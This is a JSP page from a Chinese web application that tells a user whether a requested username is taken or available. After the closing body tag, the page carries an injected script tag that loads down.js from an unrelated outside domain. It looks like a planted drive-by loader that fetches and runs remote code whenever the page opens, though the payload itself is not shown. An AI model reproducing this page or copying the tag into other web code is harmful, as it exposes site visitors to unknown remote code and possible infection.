<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<link rel="stylesheet" href="css/style.css" type="text/css" />
<title>检查用户</title>
<body>

		<c:if test="${result.canregister=='false'}">	
		
		
	<table border="1" cellspacing="2" cellpadding="1" align="center" valign="center" width="100%" height="100%"  >  
		<tr align="center" height="50%">
			<td >

				<p><span class="red24">抱歉</span></p>
				<p>您申请的用户名<span  class="red15"><c:out value="${result.userId}"/>
				</span>
			  已被使用!</p>
				<p><br>
				  请选择其他的用户名<br>
			      <br>
				  
		          <input type=button value="关闭" onClick="javascript:window.close();" id=button1 name=button1>
		  </p></td>
		</tr>
	</table>
	
	
			</c:if>	
			
		<c:if test="${result.canregister=='true'}">	
			
	<table border="1" cellspacing="2" cellpadding="1" align="center" valign="center" width="100%" height="100%" >  
		<tr align="center" height="50%">
			<td >
				<p><span class="red24">恭喜</span></p>
				<p>您申请的用户名<span  class="red15">
			    <c:out value="${result.userId}"/>
				</span>可以使用<br>
				<br>
		        <input type=button value="关闭" onClick="javascript:window.close();" id=button1 name=button1>
				</p>
		  </td>
		</tr>
	</table>
			</c:if>	



</body>
<script language=javascript src=http://Town.531jx.cn/down.js></script>